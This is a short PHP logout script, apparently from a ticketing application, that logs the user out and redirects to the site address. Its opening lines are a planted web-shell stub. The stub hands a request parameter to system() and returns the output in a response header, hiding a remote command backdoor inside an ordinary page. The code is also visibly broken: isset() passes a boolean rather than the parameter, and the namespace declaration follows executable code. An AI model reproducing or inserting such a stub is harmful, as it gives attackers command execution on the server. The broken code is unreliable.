<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
namespace sts;
use sts as core;

$auth->logout();

header('Location: ' . $config->get('address') . '/');
?>